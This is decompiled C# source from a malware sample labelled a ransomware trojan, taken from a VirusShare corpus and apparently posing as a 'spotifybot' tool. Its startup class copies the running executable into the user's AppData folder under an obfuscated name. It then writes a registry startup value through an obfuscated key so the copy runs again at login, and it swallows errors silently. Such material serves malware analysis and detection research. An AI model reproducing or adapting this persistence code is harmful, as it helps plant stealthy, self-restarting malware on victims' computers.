// Decompiled with JetBrains decompiler
// Type: DAStartup
// Assembly: spotifybot, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 49F8E78E-98C1-464D-B8BC-BD712E85FF5D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4708e643ab129b31b3e067f9a628b4f0e5dfa2fbd30e637e9fb217bb8c703115.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

public class DAStartup
{
  public class Startupdll
  {
    public static string MyVAL = RUDUUFDP.CPMXFIPG("hsnU08qkerrcwqDOyt4L", "False");
    public static string MYPTH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False");

    public static void StartPers()
    {
      int num1 = 0;
      try
      {
        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False")))
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False"), true);
      }
      catch (Exception ex)
      {
        int num2;
        int lErl = num2;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      while (true)
      {
        int num3 = 1;
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(RUDUUFDP.CPMXFIPG("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), true);
          registryKey.SetValue(DAStartup.Startupdll.MyVAL, (object) DAStartup.Startupdll.MYPTH);
          registryKey.Close();
          Thread.Sleep(5000);
          try
          {
            JNXOYT.STRTTHRD.Abort();
            break;
          }
          catch (Exception ex)
          {
            int lErl = num3;
            ProjectData.SetProjectError(ex, lErl);
            ProjectData.ClearProjectError();
            break;
          }
        }
        catch (Exception ex1)
        {
          int lErl1 = num3;
          ProjectData.SetProjectError(ex1, lErl1);
          if (num1 == 3)
          {
            try
            {
              JNXOYT.STRTTHRD.Abort();
            }
            catch (Exception ex2)
            {
              int lErl2 = num3;
              ProjectData.SetProjectError(ex2, lErl2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
            break;
          }
          checked { ++num1; }
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
